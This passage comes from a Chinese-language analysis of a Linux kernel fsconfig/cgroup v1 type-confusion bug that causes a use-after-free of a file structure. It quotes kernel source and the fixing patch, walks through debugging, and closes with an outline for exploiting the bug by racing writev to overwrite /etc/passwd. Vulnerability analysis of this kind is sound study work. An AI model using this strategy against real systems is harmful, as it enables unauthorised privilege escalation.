            param.name = getname_flags(_value, lookup_flags, NULL);
            if (IS_ERR(param.name)) {
                ret = PTR_ERR(param.name);
                goto out_key;
            }
            param.dirfd = aux;
            param.size = strlen(param.name->name);
            break;
        case FSCONFIG_SET_FD:
            param.type = fs_value_is_file;
            ret = -EBADF;
            param.file = fget(aux);
            if (!param.file)
                goto out_key;
            break;
        default:
            break;
    }

    ret = mutex_lock_interruptible(&fc->uapi_mutex);
    if (ret == 0) {
        ret = vfs_fsconfig_locked(fc, cmd, ¶m);
        mutex_unlock(&fc->uapi_mutex);
    }

    /* Clean up the our record of any value that we obtained from         * userspace.  Note that the value may have been stolen by the LSM or         * filesystem, in which case the value pointer will have been cleared.         */
    switch (cmd) {
        case FSCONFIG_SET_STRING:
        case FSCONFIG_SET_BINARY:
            kfree(param.string);
            break;
        case FSCONFIG_SET_PATH:
        case FSCONFIG_SET_PATH_EMPTY:
            if (param.name)
                putname(param.name);
            break;
        case FSCONFIG_SET_FD:
            if (param.file)
                fput(param.file);
            break;
        default:
            break;
    }
    out_key:
    kfree(param.key);
    out_f:
    fdput(f);
    return ret;
}
```  
  
这个系统调用允许挂载自己的文件系统而不用修改内核，它在调用的过程中存在类型混淆漏洞。  
  
在选项 5 有个可以释放文件的操作 FSCONFIG_SET_FD，在解释参数的时候，会调用到下面的函数  
```
int vfs_parse_fs_param(struct fs_context *fc, struct fs_parameter *param)
{
        int ret;

        if (!param->key)
                return invalf(fc, "Unnamed parameter\n");

        ret = vfs_parse_sb_flag(fc, param->key);
        if (ret != -ENOPARAM)
                return ret;

        ret = security_fs_context_parse_param(fc, param);
        if (ret != -ENOPARAM)
                /* Param belongs to the LSM or is disallowed by the LSM; so                 * don't pass to the FS.                 */
                return ret;

        if (fc->ops->parse_param) {
                ret = fc->ops->parse_param(fc, param);//这个地方调用了cgroup1_parse_param
                if (ret != -ENOPARAM)
                        return ret;
        }

        /* If the filesystem doesn't take any arguments, give it the         * default handling of source.         */
        if (strcmp(param->key, "source") == 0) {
                if (param->type != fs_value_is_string)
                        return invalf(fc, "VFS: Non-string source");
                if (fc->source)
                        return invalf(fc, "VFS: Multiple sources");
                fc->source = param->string;
                param->string = NULL;
                return 0;
        }

        return invalf(fc, "%s: Unknown parameter '%s'",
                      fc->fs_type->name, param->key);
}

int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)
{
    struct cgroup_fs_context *ctx = cgroup_fc2context(fc);
    struct cgroup_subsys *ss;
    struct fs_parse_result result;
    int opt, i;

    opt = fs_parse(fc, cgroup1_fs_parameters, param, &result);
    if (opt == -ENOPARAM) {
        if (strcmp(param->key, "source") == 0) {
            if (fc->source)
                return invalf(fc, "Multiple sources not supported");
            fc->source = param->string;
            param->string = NULL;
            return 0;
        }
        for_each_subsys(ss, i) {
            if (strcmp(param->key, ss->legacy_name))
                continue;
            if (!cgroup_ssid_enabled(i) || cgroup1_ssid_disabled(i))
                return invalfc(fc, "Disabled controller '%s'",
                               param->key);
            ctx->subsys_mask |= (1 << i);
            return 0;
        }
        return invalfc(fc, "Unknown subsys name '%s'", param->key);
    }
    if (opt < 0)
        return opt;

    switch (opt) {
        case Opt_none:
            /* Explicitly have no subsystems */
            ctx->none = true;
            break;
        case Opt_all:
            ctx->all_ss = true;
            break;
        case Opt_noprefix:
            ctx->flags |= CGRP_ROOT_NOPREFIX;
            break;
        case Opt_clone_children:
            ctx->cpuset_clone_children = true;
            break;
        case Opt_cpuset_v2_mode:
            ctx->flags |= CGRP_ROOT_CPUSET_V2_MODE;
            break;
        case Opt_xattr:
            ctx->flags |= CGRP_ROOT_XATTR;
            break;
        case Opt_release_agent:
            /* Specifying two release agents is forbidden */
            if (ctx->release_agent)
                return invalfc(fc, "release_agent respecified");
            ctx->release_agent = param->string;
            param->string = NULL;
            break;
        case Opt_name:
            /* blocked by boot param? */
            if (cgroup_no_v1_named)
                return -ENOENT;
            /* Can't specify an empty name */
            if (!param->size)
                return invalfc(fc, "Empty name");
            if (param->size > MAX_CGROUP_ROOT_NAMELEN - 1)
                return invalfc(fc, "Name too long");
            /* Must match [\w.-]+ */
            for (i = 0; i < param->size; i++) {
                char c = param->string[i];
                if (isalnum(c))
                    continue;
                if ((c == '.') || (c == '-') || (c == '_'))
                    continue;
                return invalfc(fc, "Invalid name");
            }
            /* Specifying two names is forbidden */
            if (ctx->name)
                return invalfc(fc, "name respecified");
            ctx->name = param->string;
            param->string = NULL;
            break;
    }
    return 0;
}
```  
  
通过 PATCH 文件可以看出来（实则因为菜实在分析不来）  
```
diff --git a/kernel/cgroup/cgroup-v1.c b/kernel/cgroup/cgroup-v1.c
index ee93b6e895874..527917c0b30be 100644
--- a/kernel/cgroup/cgroup-v1.c
+++ b/kernel/cgroup/cgroup-v1.c
@@ -912,6 +912,8 @@ int cgroup1_parse_param(struct fs_context *fc, struct fs_parameter *param)
         opt = fs_parse(fc, cgroup1_fs_parameters, param, &result);
         if (opt == -ENOPARAM) {
                 if (strcmp(param->key, "source") == 0) {
+                        if (param->type != fs_value_is_string)
+                                return invalf(fc, "Non-string source");
                         if (fc->source)
                                 return invalf(fc, "Multiple sources not supported");
                         fc->source = param->string;
```  
  
如果 key 为 source，那么 param->type 必须被指定为 string 类型而不能是文件描述符，此时因为外面的 cmd=FSCONFIG_SET_FD，因此获取了文件结构在联合体当中。  
```
struct fs_parameter {
    const char                *key;                /* Parameter name */
    enum fs_value_type        type:8;                /* The type of value here */
    union {
        char                *string;
        void                *blob;
        struct filename        *name;
        struct file        *file;
    };
    size_t        size;
    int        dirfd;
};
```  
  
在判断中可以看到这样一句：  
```
if (strcmp(param->key, "source") == 0) {
    if (fc->source)
        return invalf(fc, "Multiple sources not supported");
    fc->source = param->string;
    param->string = NULL;
    return 0;
}
```  
  
此时将 string 保存在 fc->source 当中，因为它们共用内存，所以这里的 string 实际上是 struct file 结构体指针。  
  
最后要 free 掉这个 fs_context 结构时，就意外地造成了这里的文件结构的 uaf，最后这个系统调用完成会触发 fscontext_release。  
```
void put_fs_context(struct fs_context *fc)
{
    struct super_block *sb;

    if (fc->root) {
        sb = fc->root->d_sb;
        dput(fc->root);
        fc->root = NULL;
        deactivate_super(sb);
    }

    if (fc->need_free && fc->ops && fc->ops->free)
        fc->ops->free(fc);

    security_free_mnt_opts(&fc->security);
    put_net(fc->net_ns);
    put_user_ns(fc->user_ns);
    put_cred(fc->cred);
    put_fc_log(fc);
    put_filesystem(fc->fs_type);
    kfree(fc->source);//这里意外地 free 掉了文件结构
    kfree(fc);
}
static int fscontext_release(struct inode *inode, struct file *file)
{
    struct fs_context *fc = file->private_data;

    if (fc) {
        file->private_data = NULL;
        put_fs_context(fc);
    }
    return 0;
}
```  
## 代码调试  
### 触发UAF  
  
第一步打断点 __do_sys_fsconfig，然后跟到图示这个位置，可以发现获取到了文件结构了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKia3kia1AqibC0n941g0TxLbWwB8m29hBJbErm28IoVicoN7JpmRiaYAGabw/640?wx_fmt=png&from=appmsg "")  
  
随后跟到这个位置  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKh4yYO8Ky47C1tHFAFc2WxsPtZpEGyWtN4Eoib3ZFfNt2e9vUSnKadZQ/640?wx_fmt=png&from=appmsg "")  
  
这里会有调用刚刚的 cgroup1_parse_param，当然也可以直接下断点 continue 过去。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9aCaSuFIZrs6DtFFghVnIDrx8XEsNf5oLVNEqOK16dp3EAKuvfsibmA/640?wx_fmt=png&from=appmsg "")  
  
当然这里可以看到 source 直接被取走了，保存到了 fc 结构当中。  
  
随后下断在 fscontext_release，然后 continue 过去，走到 kfree 这和位置可以发现 source 被释放。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOK9QGRG15RN0WXar0206ibxKlVXuQCKVYVwXZNDfKK8zF8luwBh4zHxaQ/640?wx_fmt=png&from=appmsg "")  
  
这里也能看到作者原意是想在这里释放 source 字符串，但是这里释放了 file 文件结构指针，调试的时候可以和之前对一下，发现地址是一致的，因此这里造成了 uaf。  
### 延长竞争时间  
  
这里采用 writev 写入大量数据使得文件拿锁的时间加长。为了调试 exp，可以用 add-symbol-file 命令去添加符号，这里可以选择断 write_cmd 的 writev 函数，因为这里会因为写入数据量过大而长期持有锁，writev 就会尝试持续获得锁。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKobv3ScTdumMGgVy7s004TcPC57owjahuSb5bG7uY9OQ3tqvBU0FM1w/640?wx_fmt=png&from=appmsg "")  
  
随后经过系统调用来到 do_writev 函数  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LFPriaSjBUZI9GVhDhnaGIMS9q4sRhAOKGhLZqBlbsv8gLBZJTGdp1JrKLApHI4H2c23Md3icIup6P6UoreLbssw/640?wx_fmt=png&from=appmsg "")  
  
不过这里多线程比较难调，也不放调试具体过程了，感觉原理还是比较浅显易懂的。  
## 总结  
  
我们可以总结出以下的利用思路：  
- fsconfig 系统调用的代码存在类型混淆漏洞，间接导致了可以使得某文件描述符结构被 uaf  
  
- 通过写入大量数据延长竞争时间，通过建立一个链接的方式绕过 open 时赋予的标记位，使得两个线程可以卡在权限校验之后。  
  
- 第三个线程在第二个线程卡住的时间申请 /etc/passwd 文件的结构，替换线程 2 正在写入的文件，完成漏洞利用。  
  
分析的还有很多不足之处，如果有讲的不好的地方恳请师傅多多包涵并帮助指正。  
  
**-官方论坛**  
  
www.52pojie.cn  
  
  
  
**👆👆👆**  
****  
  
公众号  
**设置“星标”，**您  
**不会错过**  
新的消息通知  
  
如**开放注册、精华文章和周边活动**  
等公告  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/LFPriaSjBUZK0l7v6mmrudZKXzpdM1WcomgJQnibvLzBUFRSurSkmIfl0ZrDNvSy3MszKNY3XOkcuUbWp31HMjLQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
